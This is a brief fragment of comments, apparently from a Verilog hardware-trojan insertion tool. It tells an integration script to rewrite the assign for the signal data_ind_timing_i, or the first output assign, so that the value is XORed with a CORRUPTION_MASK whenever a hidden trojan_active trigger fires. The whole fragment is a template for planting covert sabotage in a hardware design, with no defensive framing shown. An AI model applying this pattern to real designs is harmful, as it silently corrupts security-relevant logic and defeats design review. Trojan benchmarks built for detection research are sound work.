...
//
// IMPORTANT: data_ind_timing_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If data_ind_timing_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for data_ind_timing_i (or first output assign):
//     assign data_ind_timing_i = <expr>;
//   Replace with:
//     assign data_ind_timing_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
